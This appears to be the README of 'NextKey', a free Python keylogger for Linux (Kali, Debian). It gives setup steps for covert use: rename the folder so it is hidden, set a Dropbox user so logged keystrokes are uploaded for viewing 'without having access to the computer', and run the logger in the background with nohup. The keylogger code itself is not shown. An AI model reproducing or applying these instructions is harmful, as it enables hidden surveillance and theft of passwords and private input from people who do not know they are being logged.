Free copyleft KeyLogger. Works for all Linux, but most importantly for Kali and Debian.
Original source code, by Dani Diaz.

#Download
Python
Python-Xlib

Execute the download file, to download all the needed packages. Packages:
python-xlib
git

#Hide folder and documents

To hide NextKey folder change the name of the folder to ".NextKey"
You can find it typing "ls -a"

#Requirements

YOU NEED TO CHANGE THIS VARIABLES TO RUN THE CODE:
The variable logFile will locate all the Keys in the selected files.
The variable dropboxUser will save your file in the cloud, to see it without having access to the computer

#Run the unhidden NextKey
python keylogger.py
 
#Run the hidden NextKey
nohup python keylogger.py
#Find the projects PID
ps -ef | grep python
#Quit that PID
kill PID
